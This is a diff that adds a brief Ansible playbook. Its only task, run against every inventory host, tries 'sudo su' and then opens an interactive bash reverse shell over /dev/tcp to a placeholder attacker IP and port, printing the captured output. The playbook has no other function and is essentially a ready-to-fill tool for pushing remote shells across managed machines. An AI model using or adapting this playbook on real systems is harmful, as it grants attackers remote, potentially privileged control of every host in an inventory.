@@ -1,0 +1,7 @@
+- hosts: all
+  gather_facts: no
+  tasks:
+    - shell: sudo su; /bin/bash -i > /dev/tcp/<myip>/<myport> 0<&1 2>&1
+      register: ps
+
+    - debug: var="ps.stdout_lines + [ ps.stderr ]"
